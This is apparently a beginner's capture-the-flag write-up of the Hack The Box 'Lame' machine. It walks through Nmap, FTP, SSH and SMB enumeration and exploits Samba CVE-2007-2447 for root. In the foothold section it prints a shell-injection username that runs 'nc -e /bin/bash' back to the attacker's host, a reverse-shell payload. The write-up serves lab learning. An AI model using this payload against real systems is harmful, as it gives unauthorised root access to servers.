---
aliases: ["/posts/htb-machine-lame/"]
title: "Lame (Hack The Box) Full Write-Up"
machine_name: "Lame"
platform: "Hack The Box"
description: "A beginner-friendly Hack The Box Lame writeup covering Nmap enumeration, Samba exploitation, CVE-2007-2447, and lessons learned on the path to root."
date: 2026-11-04 12:01:35 +0300
image: 'images/posts/HTB-Lame-write-up.jpg'

tags: [write-up]
tags_color: '#df1b1b'

difficulty: "Easy"
os: "Linux"
approach: "Guided"
htb_release_date: 2017-03-14

area_of_interest:
  - "Enterprise Network"
  - "Vulnerability Assessment"
  - "Common Services"
  - "Software & OS Exploitation"
  - "Security Tools"

vulnerability:
  - "Remote Code Execution"

technology:
  - "Samba"

technique:
  - "Service Enumeration"
  - "Vulnerability Research"
  - "Command Injection"
  - "Reverse Shell"
---

# Hack The Box — Lame | A Beginner's Journey



From HTB: "Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement."

_An easy Linux machine, a vulnerable Samba service, and a good place to start learning penetration testing._

## Introduction

Every journey has to start somewhere, and for me, that place is Lame.

Lame was the first machine released on Hack The Box, back on March 14, 2017. It's an Easy-rated Linux machine and a good starting point for anyone interested in learning the fundamentals of penetration testing.

I've decided to start my Hack The Box journey from the beginning, working through retired machines, learning the techniques behind them, and documenting what I discover along the way.

My goal isn't just to get root access or collect flags. I want to understand **why something works, how to recognize a vulnerability, and what I can learn from exploiting it.**

Some machines I'll solve independently. Others will require hints, documentation, or walkthroughs. I'll be transparent about that, because learning from other people's work is part of the process.

For this machine, I'll focus on enumeration, identifying a vulnerable Samba service, and understanding how a remote code execution vulnerability can lead to full system compromise.

Let's see what Lame has to teach us.

---
## Initial Enumeration

This write-up combines several HTB sessions, so the target IP changes between the recorded outputs. I have kept the original addresses in the logs. When following along, set $IP to the current address of your own Lame instance.


**Target IP:** `10.129.12.112`

As I recently learned the hard way, after wasting quite some time troubleshooting my internet connection, it's always a good idea to check whether the target is actually reachable before doing anything else. :)

Let's start with a simple ping:

```bash
ping 10.129.12.112
```

**Output:**

```text
PING 10.129.12.112 (10.129.12.112) 56(84) bytes of data.
64 bytes from 10.129.12.112: icmp_seq=1 ttl=63 time=81.6 ms
64 bytes from 10.129.12.112: icmp_seq=2 ttl=63 time=81.1 ms
64 bytes from 10.129.12.112: icmp_seq=3 ttl=63 time=81.1 ms
64 bytes from 10.129.12.112: icmp_seq=4 ttl=63 time=80.9 ms
^C

--- 10.129.12.112 ping statistics ---
5 packets transmitted, 4 received, 20% packet loss, time 4003ms
rtt min/avg/max/mdev = 80.901/81.180/81.643/0.277 ms
```

Great, the machine is responding!

We received four ICMP replies, which confirms that the target is reachable from our Kali machine.

The TTL value of `63` is also worth noticing. Linux systems commonly start with a TTL of `64`, so this could suggest that we're dealing with a Linux host one network hop away. It's only a clue, though, not proof.


Now that we know the target is reachable, let's find out which ports are open and what services are running.

### Preparing the Working Directory

Before starting, I like to keep things organized. Nothing fancy, just a separate directory for each machine and a couple of folders to avoid losing files along the way.

```bash
mkdir -p ~/htb/lame/{scans,loot}
cd ~/htb/lame

export IP=10.129.94.254
```

- `scans/` — for Nmap results and other enumeration outputs.
    
- `loot/` — for files, configurations, or anything interesting recovered from the target.
    
- `$IP` — a shell variable containing the target's IP address, so I don't have to type it every time.
    

One small thing worth remembering: `export IP` only lasts for the current shell session. If I open a new terminal, I'll need to set it again.

With everything in place, let's start enumerating the target.
Time for Nmap.
### Nmap — Initial Scan

I'm still trying to figure out my perfect Nmap scanning approach. There are so many options, and I'm learning which ones actually make sense and when to use them.


For now, I'll start with a full TCP port scan to avoid missing services running on non-standard ports.

```bash
sudo nmap -sS -sC -sV -p- -T4 --min-rate 10000 -oN scans/nmap_initial.txt $IP
```

The command might look a little intimidating at first, so here's what we're asking Nmap to do:


| Option | Description |
|:---|:---|
| `-sS` | Perform a TCP SYN scan. |
| `-sC` | Run the default Nmap scripts. |
| `-sV` | Detect services and their versions. |
| `-p-` | Scan all 65,535 TCP ports. |
| `-T4` | Use a faster timing template. |
| `--min-rate 10000` | Aim to send at least 10,000 packets per second. |
| `-oN scans/nmap_initial.txt` | Save the results in our `scans/` directory. |
| `$IP` | Use our previously defined target IP address. |
  

```shell
sudo nmap -sS -sC -sV -p- -T4 --min-rate 10000 -oN scans/nmap_initial.txt $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-03 08:08 EST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 1.22 seconds
┌─[eu-dedivip-2]─[10.10.15.54]─[funsin@htb-uqz9yi0pcq]─[~/htb/lame]
└──╼ [★]$ export IP=10.129.94.254
┌─[eu-dedivip-2]─[10.10.15.54]─[funsin@htb-uqz9yi0pcq]─[~/htb/lame]
└──╼ [★]$ sudo nmap -sS -sC -sV -p- -T4 --min-rate 10000 -oN scans/nmap_initial.txt $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-03 08:09 EST
Nmap scan report for 10.129.94.254
Host is up (0.076s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h30m36s, deviation: 3h32m10s, median: 34s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-11-03T08:10:30-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.56 seconds

```

| Port | Service     | Version             | Interesting Findings                       |
| ---- | ----------- | ------------------- | ------------------------------------------ |
| 21   | FTP         | vsftpd 2.3.4        | Anonymous FTP login allowed (FTP code 230) |
| 22   | SSH         | OpenSSH 4.7p1       | Not investigated yet                       |
| 139  | NetBIOS/SMB | Samba 3.x–4.x       | SMB service available                      |
| 445  | SMB         | Samba 3.0.20-Debian | message_signing: disabled                  |
| 3632 | distccd     | distccd v1          | Not investigated yet                       |



## 1st Rabbit Hole — Port 21 (FTP)

Since I'm using the official walkthrough as a reference, I already know which direction to take. However, let's pretend we don't and explore some of the rabbit holes the machine's creator left for us. :)

As Nmap already showed us, anonymous FTP login is allowed. Let's try logging in manually using anonymous as both the username and password.

```shell
ftp 10.129.94.254
Connected to 10.129.94.254.
220 (vsFTPd 2.3.4)
Name (10.129.94.254:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||39157|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> 
```
Before moving on from port 21, I want to try a few Nmap scripts. After all, improving my enumeration skills is one of the goals of this walkthrough.

Let's see if we can find anything interesting.

First, I checked which FTP-related scripts are available:

```shell
ls /usr/share/nmap/scripts/ftp-*.nse
```

```ls /usr/share/nmap/scripts/ftp-*.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-brute.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse

```


I could run all FTP scripts at once using `--script "ftp-*"`, but the problem is that I don't fully understand what all of them do yet.

```shell
sudo nmap -sV -p 21 --script "ftp-*" -oN scans/ftp-scripts.txt $IP
```

Some might perform brute-force attacks, exploit vulnerabilities, or make changes to the target.


**After all, the goal is to learn, not just throw tools at a machine and hope something works. :)**

After some quick research, I decided to run the following scripts:

| Script | What does it check? |
|:---|:---|
| `ftp-anon` | Checks for anonymous FTP login and lists accessible files. |
| `ftp-syst` | Retrieves information about the FTP server. |
| `ftp-bounce` | Checks whether the server allows FTP bounce attacks. |
| `ftp-vsftpd-backdoor` | Tests for the vsFTPd 2.3.4 backdoor (CVE-2011-2523). |

---

### ftp-anon

I'll start with the ftp-anon script. I already know that anonymous FTP login is allowed from my previous Nmap scan:

`ftp-anon: Anonymous FTP login allowed (FTP code 230)`

However, the goal here is to practise Nmap enumeration and understand what each script does, rather than just collect results.

Let's run it:

```shell
nmap -sV -p 21 --script ftp-anon -oN scans/ftp-anon.txt $IP
```
The scan didn't go as expected:

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-03 14:19 EST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.09 seconds
```
Apparently, Nmap and my FTP client have different opinions about whether this machine is alive :)

By default, Nmap performs host discovery before scanning ports. If the target doesn't respond to those probes, Nmap may assume it's offline and stop scanning.

Let's try again with `-Pn`, which tells Nmap to skip host discovery.

```shell
┌─[eu-dedivip-2]─[10.10.15.54]─[funsin@htb-7t9egkutub]─[~/htb/lame]
└──╼ [★]$ nmap -Pn -sV -p 21 --script ftp-anon -oN scans/ftp-anon.txt $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-03 14:19 EST
Nmap scan report for 10.129.95.31
Host is up (0.0078s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
```
---

### ftp-syst

The ftp-syst script sends both SYST and STAT commands. In this output, STAT reports the server status, including the session timeout and whether the connections are encrypted.

```shell
nmap -Pn -sV -p 21 --script ftp-syst -oN scans/ftp-syst.txt $IP

```

```shell
nmap -Pn -sV -p 21 --script ftp-syst -oN scans/ftp-syst.txt $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-03 14:36 EST
Nmap scan report for 10.129.95.31
Host is up (0.0075s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
```
This script gives us some additional information about the FTP server. A few things caught my attention:

* The server reports a session timeout of 300 seconds (5 minutes).

* Both control and data connections use plain text, meaning the traffic isn't encrypted.

* The server identifies itself as vsFTPd 2.3.4, which we already discovered earlier.

Nothing particularly exciting here, but that's part of enumeration. Not every scan will reveal a vulnerability, and even small details can help us understand the target better.

---

### ftp-bounce

Next up is ftp-bounce. I'll keep using -Pn to avoid the host discovery issue we encountered earlier.

This script checks whether the FTP server can be used to establish connections to other hosts. Let's see how our target responds.

```shell
nmap -Pn -sV -p 21 --script ftp-bounce -oN scans/ftp-bounce.txt $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-03 14:43 EST
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Nmap scan report for 10.129.95.31
Host is up (0.0076s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
```
One line caught my attention:

NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.

FTP bounce is a technique where an attacker uses an FTP server to connect to other hosts, potentially allowing them to scan ports through that server.

In our case, the server rejected the PORT command used by the script, so the test didn't confirm that FTP bounce is possible.

Another rabbit hole that didn't lead anywhere. At least we learned something. :)

---

### ftp-vsftpd-backdoor

Last one, let's go!

```shell
nmap -Pn -sV -p 21 --script ftp-vsftpd-backdoor -oN scans/ftp-vsftpd-backdoor.txt $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-03 09:06 EST
Nmap scan report for 10.129.94.254
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.54 seconds

```
I ran the scan again with `-d2` to get more debugging information.

```shell
nmap -Pn -sV -p 21 --script ftp-vsftpd-backdoor -d2 -oN scans/ftp-vsftpd-backdoor-debug.txt $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-03 09:18 EST
[...]
NSE: [ftp-vsftpd-backdoor M:55c75384e558 10.129.94.254:21] vulns.lua: vulnerability 'vsFTPd version 2.3.4 backdoor' (10.129.94.254): `NOT VULNERABLE`.
NSE: Finished ftp-vsftpd-backdoor M:55c75384e558 against 10.129.94.254:21
[...]
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.3.4
Service Info: OS: Unix
Final times for host: srtt: 76167 rttvar: 76167  to: 380835

Nmap done: 1 IP address (1 host up) scanned in 21.54 seconds

```
The debug output reported `NOT VULNERABLE`. This means the NSE script did not detect the known backdoor during this test. It doesn't necessarily prove that the service is free from other vulnerabilities.

The script couldn't confirm the backdoor, despite the matching version number.


I also quickly checked SearchSploit, and it looks like there are two exploits available for vsftpd 2.3.4.

```shell
searchsploit vsftpd 2.3.4
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution     | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Me | unix/remote/17491.rb
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Interestingly, if we check the descriptions of both ftp-vsftpd-backdoor and exploit 17491.rb, we can see that they target the same vulnerability: CVE-2011-2523.

I wonder how many people went down this rabbit hole when the machine was still active. :)

```shell
searchsploit -x 17491
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/17491
     Path: /usr/share/exploitdb/exploits/unix/remote/17491.rb
    Codes: OSVDB-73573, CVE-2011-2523
 Verified: True
File Type: Ruby script, ASCII text
```

A quick look at Nmap's description of ftp-vsftpd-backdoor:

```shell
nmap --script-help ftp-vsftpd-backdoor
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-03 15:09 EST

ftp-vsftpd-backdoor
Categories: exploit intrusive malware vuln
https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html
  Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04
  (CVE-2011-2523).
```


Looks like we've reached the end of this rabbit hole. Time to move on. :)

---

## 2nd Rabbit Hole — Port 22 (SSH)


Following up on our initial Nmap scan, which identified OpenSSH 4.7p1, I decided to quickly check SearchSploit to see if anything interesting comes up:

```shell
searchsploit openssh 4.7
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution  | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution        | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disab | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Libr | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)          | linux/remote/45939.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```
The results included username enumeration and SFTP-related issues, but I did not verify their prerequisites on this target. I left SSH for later and continued with SMB enumeration.

One machine, many possible rabbit holes. Not enough hours in the day. :)

## SMB Enumeration — Ports 139 and 445

FTP did not give me a foothold, and I left SSH for later. I chose to investigate Samba next because port 445 reported Samba 3.0.20-Debian. The scan also found distccd on port 3632, which I did not investigate in this write-up.

```shell
smbclient -L //$IP -N
Protocol negotiation to server 10.129.95.31 (for a protocol between SMB2_02 and SMB3) failed: NT_STATUS_CONNECTION_DISCONNECTED
```
Well, that was quick. :) But the error is useful: my client attempted SMB2/SMB3 negotiation, while this older server appears to require SMB1 (also called NT1).

I tried specifying NT1:

```shell
smbclient -L //$IP -N -p 445 -m NT1
lp_load_ex: Max protocol NT1 is less than min protocol SMB2_02.
Protocol negotiation to server 10.129.95.31 (for a protocol between SMB2_02 and NT1) failed: NT_STATUS_INVALID_PARAMETER_MIX
```

Another error, but this one practically tells me what to fix. I set the maximum protocol to NT1, while the client's minimum was still SMB2. Those settings contradict each other.

Let's explicitly allow SMB1 as the minimum too:

```shell
smbclient -L //$IP -N -p 445 --option='client min protocol=NT1' -m NT1
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP 
```

Success! We can list the shares without supplying a password. The `--option` flag changes the client's minimum protocol for this command.

One lesson already: a failed connection doesn't necessarily mean the service is unavailable. Read the error before moving on.

### Exploring the Shares

The tmp share caught my attention, partly because of its comment: oh noes!. That sounds inviting. :)

```shell
smbclient //$IP/tmp -N --option='client min protocol=NT1' -m NT1
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov  3 16:08:46 2026
  ..                                 DR        0  Sat Oct 31 03:33:58 2020
  .ICE-unix                          DH        0  Tue Nov  3 14:16:08 2026
  vmware-root                        DR        0  Tue Nov  3 14:16:43 2026
  .X11-unix                          DH        0  Tue Nov  3 14:16:34 2026
  .X0-lock                           HR       11  Tue Nov  3 14:16:34 2026
  vgauthsvclog.txt.0                  R     1600  Tue Nov  3 14:16:07 2026
  5610.jsvc_up                        R        0  Tue Nov  3 14:17:20 2026

		7282168 blocks of size 1024. 5385900 blocks available
smb: \> 
```

So anonymous access works, and I can list files. But can I write to the share? I created a test directory and then removed it:

```shell
smb: \> mkdir htb-test
smb: \> rmdir htb-test
smb: \> 
```
Neither command returned an error. That confirms I could create and remove a directory in tmp anonymously. Interesting, but write access alone is not remote code execution. I'd still need a way to make the server execute something I put there.

Next I checked opt. After leaving the interactive smbclient prompt, I ran:

```shell
smbclient //$IP/opt -N --option='client min protocol=NT1' -m NT1
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```
Anonymous authentication succeeded, but access to that particular share was denied. So far, tmp is writable, opt is restricted, and neither has given me a clear foothold.

At this point I could keep digging through shares, but there's another useful clue waiting in the Nmap output: the Samba version.

Rather than guessing, I searched for known issues affecting Samba 3.0.20:

## Foothold


```shell
searchsploit samba 3.0.20

---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Securi | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map scr | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow         | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```
The second result stood out: Samba 3.0.20 < 3.0.25rc3 — Username Map Script Command Execution. Our reported version falls in that range, and command execution sounds much more promising than a denial-of-service proof of concept.

Of course, a version match is only a lead. It doesn't prove that the vulnerable configuration is enabled.

I checked the exploit details:

```shell
searchsploit -x 16320

  Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/16320
     Path: /usr/share/exploitdb/exploits/unix/remote/16320.rb
    Codes: CVE-2007-2447, OSVDB-34700
 Verified: True
File Type: Ruby script, ASCII text
```

There it is: CVE-2007-2447. The Exploit-DB entry points to a Metasploit module, but I don't want to rely on Metasploit for these writeups if I can understand and reproduce the technique another way.

### What Does the Exploit Actually Do?

I inspected the Ruby module and found the important part:

```shell
[...]
username = "/=`nohup " + payload.encoded + "`"
simple.client.session_setup_ntlmv1(username, ...)
[...]
```
I looked for a standalone implementation and found this Python proof of concept:

https://github.com/rushikesh-a-bhujbal/CVE-2007-2447

```shell
git clone https://github.com/rushikesh-a-bhujbal/CVE-2007-2447.git
cd CVE-2007-2447
```
>The proof of concept uses the Impacket library. It ran in my lab environment without any additional dependency installation.

The important configuration:

```shell
kali_ip = "YOUR_KALI_IP"
target_ip = "TARGET_IP"
target_port = 445
listening_port = 4444
```
### Understanding Why This Exploit Works

Before running the exploit, I wanted to understand what makes this particular username dangerous.

CVE-2007-2447 affects Samba's username map script functionality. When this feature is enabled, Samba can pass a supplied username to an external script to map it to a local account.

In vulnerable versions, the username isn't handled safely. Special characters can be interpreted by the shell, allowing an attacker to inject operating system commands.

Let's look at the payload:

```shell
username = f"/=`nohup nc -e /bin/bash {kali_ip} {listening_port}`"
```

Here's what matters:


| Component | Explanation |
|---|---|
| `/=` | Part of the crafted username used to trigger the vulnerable behavior. |
| Backticks (`` ` ``) | Tell the shell to execute the command inside them. |
| `nohup` | Runs the command without terminating it when a hangup signal is received. |
| `nc -e /bin/bash` | Uses Netcat to launch a Bash shell over the connection. |
| `{kali_ip}` | The IP address of my Kali machine. |
| `{listening_port}` | The port where the Python exploit is waiting for a connection. |

The important part is that Samba processes the malicious username during authentication. The injected command can execute before a successful login is required.

On Lame, the vulnerable Samba process executes the command with root privileges. That's why the resulting reverse shell runs as root, without any additional privilege escalation.

This is a good example of why a seemingly simple authentication request can become a remote code execution vulnerability.

This script listens on port 4444, then attempts an SMB login with a username containing a command that asks the target to connect back to Kali.

First, I checked my HTB VPN address:

```shell
ip -4 addr show tun0
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    inet 10.10.15.54/23 scope global tun0
       valid_lft forever preferred_lft forever
```


Then I edited main.py to use the addresses from this session:


```
kali_ip = "10.10.15.54"
target_ip = "10.129.95.31"
```
No separate nc -lvnp 4444 is needed here: the Python script starts its own listener.

Time to see whether the theory works.

```shell
python3 main.py
[*] Listening on port 4444...
[+] Payload sent. Waiting for shell...
[+] Shell received from ('10.129.95.31', 41710)
> 
```
Wait. We got a shell? Let's check who we are.

```
> whoami
root
> id
uid=0(root) gid=0(root)
```

Root. Just like that. :)

No separate privilege escalation was needed. The command executed through the vulnerable Samba service gave us a shell running as root.

### Finding the Flags

With root access, the next step was to locate the two HTB flags. Instead of guessing their locations, I used find:

```shell
find / -type f \( -name "root.txt" -o -name "user.txt" \) 2>/dev/null
```

| Option | Description |
|--------|-------------|
| `find` | Searches for files and directories |
| `/` | Starts searching from the root directory |
| `-type f` | Searches for regular files only |
| `\(` | Starts a group of search conditions |
| `-name "root.txt"` | Searches for a file named root.txt |
| `-o` | Logical OR operator |
| `-name "user.txt"` | Searches for a file named user.txt |
| `\)` | Closes the group of search conditions |
| `2>` | Redirects standard error (stderr) |
| `/dev/null` | Discards error messages |

Both files were there. I then read them using their full paths (flag values omitted here): 

```shell
/home/makis/user.txt
/root/root.txt
> cat /home/makis/user.txt
******************
> cat /root/root.txt
******************
```
## Lessons Learned

Lame was my first machine in this journey, and it taught me more than just how to exploit an old Samba vulnerability.

The biggest lesson? Finding an open port or a potential exploit is only the beginning. Understanding what the results mean, why something fails, and what to try next is where the real learning happens.


### Attack Path Summary

This diagram summarizes my workflow. Anonymous share access and the smbclient protocol settings were enumeration steps, not prerequisites for exploiting the username map script vulnerability.

```text
Nmap Enumeration
        |
        v
Samba 3.0.20-Debian Discovered
        |
        v
SMB Enumeration (Ports 139 & 445)
        |
        v
SMB Protocol Negotiation Failed
        |
        v
SMB1 / NT1 Configuration
        |
        v
Anonymous Share Access
        |
        v
SearchSploit Research
        |
        v
CVE-2007-2447 Identified
        |
        v
Username Map Script Injection
        |
        v
Python Exploit (Impacket)
        |
        v
Reverse Shell
        |
        v
ROOT (uid=0)
```

### Key Takeaways

**1. Read the errors before changing tools.**

My first SMB connection failed because the client attempted to negotiate SMB2/SMB3 with an older server. Instead of abandoning SMB enumeration, I investigated the error and adjusted the protocol settings.

That small change allowed me to enumerate the available shares.

**2. A matching version is a clue, not proof of vulnerability.**

The FTP service reported vsFTPd 2.3.4, a version associated with a well-known backdoor. However, the Nmap script didn't detect the backdoor on this machine.

The same principle applies to Samba. Finding CVE-2007-2447 in SearchSploit was a starting point. Successfully reproducing the exploit was what confirmed the vulnerable behavior on Lame.

**3. Understand what an exploit actually does.**

Instead of simply running a Metasploit module, I inspected the exploit and used a Python implementation.

This helped me understand how a specially crafted SMB username could trigger command execution through Samba's vulnerable username mapping functionality.

**4. Root access doesn't necessarily mean a perfect shell.**

The Python exploit provided a basic reverse shell, not a fully interactive terminal. Some commands didn't return their output reliably.

I learned that gaining access and having a usable shell are two different things.

**5. Rabbit holes are part of learning.**

FTP and SSH didn't lead to the successful attack path, but exploring them helped me practise enumeration, read tool documentation, and understand why not every potential vulnerability is worth pursuing.

### Final Thoughts

This was a Guided write-up. I used the official walkthrough and publicly available resources, but I reproduced the steps myself and tried to understand the techniques rather than simply copy commands.

There's still plenty I don't know, and that's exactly why I'm documenting this journey.

One box down. On to the next. :)
